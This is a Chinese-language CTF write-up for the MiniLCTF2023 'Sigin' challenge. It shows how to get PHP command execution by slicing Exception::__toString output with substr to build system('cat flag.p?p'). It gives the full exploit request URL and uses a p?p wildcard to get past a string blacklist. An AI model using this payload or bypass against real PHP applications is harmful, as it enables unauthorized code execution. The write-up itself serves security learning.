# MiniLCTF2023 - Sigin

## 题目简述

首页源码提示访问 `shell.php`。该页面允许用户控制类名、构造参数、方法名和两组 `substr` 参数，最后执行：

```php
$class = new $a($b);
$str1 = substr($class->$c(), $d, $e);
$str2 = substr($class->$c(), $f, $g);
$str1($str2);
```

过滤器只禁止少数常见内部类，并在构造参数中禁止字符串 `php`。目标是借内部类的字符串化结果同时构造函数名和命令参数。

## 解题过程

`Exception` 没有被类名黑名单拦截。`new Exception($b)` 后调用 `__toString()`，输出中会包含可控异常消息以及固定格式的文件名、行号和栈信息。把构造消息设置为连续的函数名与参数，再选择精确偏移，就能让：

```text
$str1 = system
$str2 = cat flag.p?p
```

最终一行等价于 `system("cat flag.p?p")`。文件名中的 `php` 会在构造参数阶段被过滤，因此使用单字符通配符 `p?p` 匹配 `php`。

官方环境对应的完整请求为：

```text
/shell.php?a=Exception&b=systemcat%20flag.p?p&c=__toString&d=36&e=6&f=42&g=12
```

参数含义如下：

```text
a=Exception       实例化允许的内部类
b=systemcat ...   把函数名和参数拼进异常消息
c=__toString      取得含可控消息的固定格式字符串
d=36,e=6          截出 system
f=42,g=12         截出 cat flag.p?p
```

偏移依赖题目部署中 PHP 的异常字符串格式；若本地路径或版本不同，应先输出完整 `__toString()`，再重新计算两个切片，而不是机械照搬数字。

## 方法总结

动态类名、动态方法名和可调用字符串组合在一起时，即使每一步看似只处理文本，也可能形成 RCE。内部类的 `__toString` 常含“固定前缀 + 可控消息”，适合用 `substr` 构造短函数名。字符串黑名单只能约束字面值，文件通配符仍可绕过对扩展名的简单匹配。
